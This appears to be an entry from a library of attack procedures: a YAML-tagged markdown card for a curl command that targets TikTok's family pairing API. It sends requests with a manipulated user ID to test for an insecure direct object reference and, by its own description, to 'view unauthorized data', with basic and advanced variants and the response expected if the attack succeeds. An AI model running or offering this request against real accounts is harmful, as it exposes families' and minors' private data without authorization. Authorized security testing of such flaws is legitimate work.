---
id: 123e4567-e89b-12d3-a456-426614174005
name: curl-api-id-request
type: command
executor: bash
data: >-
  curl -X POST 'https://api.tiktok.com/v1/family/pair/123456789' -H
  'Authorization: Bearer YOUR_TOKEN' -d '{"action":"view"}'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:48.404Z'
platforms:
  - Linux
  - Windows
  - macOS
tags:
  - api
  - curl
  - idor
verified: false
validated: true
submitted: true
---

# curl-api-id-request

## Command

```bash
curl -X POST 'https://api.tiktok.com/v1/family/pair/123456789' -H 'Authorization: Bearer YOUR_TOKEN' -d '{"action":"view"}'
```

## Description

Sends a POST request to TikTok's family pairing API with a manipulated user ID to test for IDOR and view unauthorized data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method | Yes |
| `https://api.tiktok.com/v1/family/pair/{id}` | Endpoint with target ID | Yes |
| `-H 'Authorization: Bearer {token}'` | Auth header | Yes |
| `-d '{json}'` | Request body | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://api.tiktok.com/v1/family/pair/123456789' -H 'Authorization: Bearer YOUR_TOKEN' -d '{"action":"view"}'
```

### Advanced Usage

```bash
curl -X GET 'https://api.tiktok.com/v1/family/pair/123456789' -H 'Authorization: Bearer YOUR_TOKEN' -v
```

## Expected Output

HTTP 200 with JSON like {"status":"paired", "user_data": {...} } if IDOR succeeds.

## Related

- [[Related Procedure]]
